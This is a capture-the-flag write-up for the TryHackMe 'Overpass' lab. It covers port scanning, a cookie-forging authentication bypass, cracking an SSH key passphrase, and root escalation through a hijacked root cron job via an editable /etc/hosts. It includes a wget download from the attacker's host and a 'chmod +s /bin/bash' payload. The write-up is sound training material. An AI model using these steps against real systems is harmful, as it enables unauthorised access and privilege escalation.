# [Overpass](https://tryhackme.com/room/overpass)

> Darshan Patel

## Overview

| Tables | Description |
| ------ | ----------- |
| Challenge Name | Overpass |
| Difficulty | Easy |
| Tags | security, owasp-top-10, cron, weasy|

---

Table of Contents
=================
* [Port Scan](#Port-Scan)
* [Directory Enumeration](#Directory-Enumeration)
* [Web Application](#Web-Application)
* [Source Code Analysis](#Source-Code-Analysis)
* [SSH Login](#SSH-Login)
* [Privillege Escalation](#Privillege-Escalation)
	* [System Enumeration](#System-Enumeration)
	* [System Exploitation](#System-Exploitation)
* [Conclusion](#Conclusion)

# Port Scan

Using `nmap` I was able to identify ports ***22*** and ***80*** as open.

```
# Nmap 7.92 scan initiated Sun Jan  2 13:46:36 2022 as: nmap -vv -sS -oN port_scan.txt 10.10.181.173
Nmap scan report for 10.10.181.173
Host is up, received echo-reply ttl 63 (0.075s latency).
Scanned at 2022-01-02 13:46:36 EST for 4s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Jan  2 13:46:40 2022 -- 1 IP address (1 host up) scanned in 3.66 seconds
```

A detailed nmap scan revealed some more information about the target's open ports.

```
# Nmap 7.92 scan initiated Sun Jan  2 13:48:06 2022 as: nmap -vv -A -oN open_ports.txt 10.10.181.173
Nmap scan report for 10.10.181.173
Host is up, received echo-reply ttl 63 (0.071s latency).
Scanned at 2022-01-02 13:48:07 EST for 21s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLYC7Hj7oNzKiSsLVMdxw3VZFyoPeS/qKWID8x9IWY71z3FfPijiU7h9IPC+9C+kkHPiled/u3cVUVHHe7NS68fdN1+LipJxVRJ4o3IgiT8mZ7RPar6wpKVey6kubr8JAvZWLxIH6JNB16t66gjUt3AHVf2kmjn0y8cljJuWRCJRo9xpOjGtUtNJqSjJ8T0vGIxWTV/sWwAOZ0/TYQAqiBESX+GrLkXokkcBXlxj0NV+r5t+Oeu/QdKxh3x99T9VYnbgNPJdHX4YxCvaEwNQBwy46515eBYCE05TKA2rQP8VTZjrZAXh7aE0aICEnp6pow6KQUAZr/6vJtfsX+Amn3
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMyyGnzRvzTYZnN1N4EflyLfWvtDU0MN/L+O4GvqKqkwShe5DFEWeIMuzxjhE0AW+LH4uJUVdoC0985Gy3z9zQU=
|   256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINwiYH+1GSirMK5KY0d3m7Zfgsr/ff1CP6p14fPa7JOR
80/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B
|_http-title: Overpass
OS fingerprint not ideal because: maxTimingRatio (1.508000e+00) is greater than 1.4
Aggressive OS guesses: Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=1/2%OT=22%CT=1%CU=35264%PV=Y%DS=2%DC=T%G=N%TM=61D1F37C%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=106%TI=Z%CI=Z%TS=A)
OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)
WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.224 days (since Sun Jan  2 08:25:48 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   69.72 ms 10.9.0.1
2   72.15 ms 10.10.181.173

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan  2 13:48:28 2022 -- 1 IP address (1 host up) scanned in 22.68 seconds
```

# Directory Enumeration

Enumerating directories with `gobuster` showed some potentially interesting directories.

![Directory_Enumeration](https://user-images.githubusercontent.com/87711310/208141244-fc8bfc57-3a84-46c9-bbaa-a4fd4bb80c69.png)

# Web Appliaction

Following the given IP address gives a homepage of Overpass password manager.

![Web_Application](https://user-images.githubusercontent.com/87711310/208141207-a67596a6-ce33-41c7-ac26-b2ae1bf9f7e5.png)

Looking at the source code of the homepage, there is an interesting comment left there about a certain Roman cipher.

![Interesting_Comment](https://user-images.githubusercontent.com/87711310/208141179-7851e26a-3e29-4584-96b1-f307af634b6b.png)

There also is the Downloads directory, which contains source code, build script and precompiled binaries for different operating systems.

![Downloads_Directory](https://user-images.githubusercontent.com/87711310/208141169-7582441a-027e-4512-96f4-dedaa4c50319.png)

Going to the Administrator page shows a login form.

![Admin_Login](https://user-images.githubusercontent.com/87711310/208141224-c9bd8cb8-c11e-439d-a892-893a782488ee.png)

The panel's source code shows a few Javascript files, `login.js` is of a particular interest.

![Login_Script](https://user-images.githubusercontent.com/87711310/208141184-a0895d5b-d36d-4d89-8ca4-7546a942599a.png)

Login function sends user-inputted username and password to `/api/login` endpoint to get a response. This response is then set as a Cookie named `SessionToken`.

The hint says that this is vulnerable to something from OWASP Top10 list. Opening that list shows that ***Broken Access Control*** is the most popular web appication vulnerability.

![OWASP_List](https://user-images.githubusercontent.com/87711310/208141186-5556f170-a0d4-4152-8975-dd9730945e20.png)

Getting back to the Overpass page and opening `Console` within Firefox Developer Tools, I copied the `Cookies.set` function to the console and set the session token value to a literal `AnyValue` string.

![Set_Cookie](https://user-images.githubusercontent.com/87711310/208141197-ffcc9228-a59a-4482-8aae-341a5407181c.png)

This led to an Administrator panel.

![Admin_Panel](https://user-images.githubusercontent.com/87711310/208141228-260ab733-d10e-4ea6-a9a9-85893ef99e65.png)

Some username as well as this user's private SSH key could be found here.

# Source Code Analysis

Analyzing source code in the `overpass.go` file confirms that the variation of Caesar cipher called `rotate 47 (ROT47)` is used for encryption.

![Caesar_Cipher](https://user-images.githubusercontent.com/87711310/208141237-c2752e6c-6ec0-4c78-ae88-8f64b887d811.png)

# SSH Login

I copied the private SSH key to a file within my local machine and set appropriate permissions for the file. Although this key is protected by a passphrase.

Using `ssh2john` I was able to convert the ssh key to a format readable by `John the Ripper` and crack the passphrase.

![SSH_Passphrase](https://user-images.githubusercontent.com/87711310/208141200-f6d65c13-083f-46c2-b9f4-43313252a78e.png)

Using the credentials I was able to log into the system and retrieve the user flag.
![User_Flag](https://user-images.githubusercontent.com/87711310/208141204-14f24652-71f0-4423-9219-39abfc2d9d8d.png)

# Privillege Escalation

Reading the `todo.txt` file gives information that some password might be stored on the system using Overpass.

The user I am logged in as has `.overpass` file, which in turn has a ROT47 encoded string.

![Encoded_String](https://user-images.githubusercontent.com/87711310/208141178-d486423e-1acc-4e45-8022-f0e367d447c9.png)

It decodes to a JSON formatted data containing username and password.

![Decoded_Credentials](https://user-images.githubusercontent.com/87711310/208141241-dbdf8ed1-8481-4ce0-96b8-69f2e4350ab2.png)

The found password is the system password of the user that I am logged in as.

## System Enumeration

For enumerating the system and finding potential attack vectors, I copied `LinPeas` to the target system. For that, I followed these steps:

1. On local machine, go to the location where the `LinPeas` script is located.

2. On local machine, start Python server.

![Python_Server](https://user-images.githubusercontent.com/87711310/208141194-c8a129e0-c97e-4a9a-a16c-bf796950078d.png)

3. On the target machine, go to `/tmp` directory.

4. On the target machine, issue `wget http://<IP>:<PORT>/linpeas` command.

![LinPeas_Download](https://user-images.githubusercontent.com/87711310/208141182-f617273f-8a65-4cfc-b780-0e4cf0da9f72.png)

Run `chmod +x linpeas_linux_amd64` to make it executable.

Linpeas scan of the target system revealed a couple of interesting things:

1. A cronjob, where the root user downloads `buildscript.sh` from `Overpass.thm` and pipes it to bash.

![Root_Cronjob](https://user-images.githubusercontent.com/87711310/208141196-528a9ef7-2249-4157-ac9d-d5c88c2ddac7.png)

2. An `/etc/hosts` file, ***editable*** by current user.

![Editable_Hosts](https://user-images.githubusercontent.com/87711310/208141174-55b7886e-7142-4cf9-b4c9-d78263a236a1.png)

## System Exploitation

1. Root user gets buildscript.sh from a `/downloads/source` directory from `overpass.thm` and pipes it to bash.
2. Since I can edit `/etc/hosts` file, I can bind ***my*** IP with overpass.thm domain.
3. On my local machine I wil create the `/downloads/src` directory.
4. In this directory I will place my malicious script.
5. My malicious script will add SUID bit to `/bin/bash` executable: `chmod +s /bin/bash`.
6. Wait for the next minute to start.
7. SUID bit is added to the `/bin/bash` executable.
8. Running `/bin/bash -p` command gives root shell.
9. Navigating to `/root` directory and reading `root.txt` file gives root flag.

# Conlusion

1. Scanned ports with nmap.
2. Enumerated directories with gobuster.
3. Found potential cipher method within the web application source code.
4. Within admin panel found a Javascript code, which sets cookie value.
5. This `Cookie.set` mechanism could be used for authentication bypass and to access admin panel.
6. Private SSH key was found as well as username.
7. SSH key had a passphrase, which was cracked with John the Ripper.
8. Logged into the system, found the user flag.
9. Downloaded LinPeas to the target system.
10. Found a cronjob that is executed as root every minute and downloads a script from a specific location.
11. Created a corresponding directory on my local machine.
12. Created a script to add sticky bit to `/bin/bash`.
13. After the cronjob executed, I issued `/bin/bash -p` command on the target and got root shell.
14. I obtained the root flag.

Done!
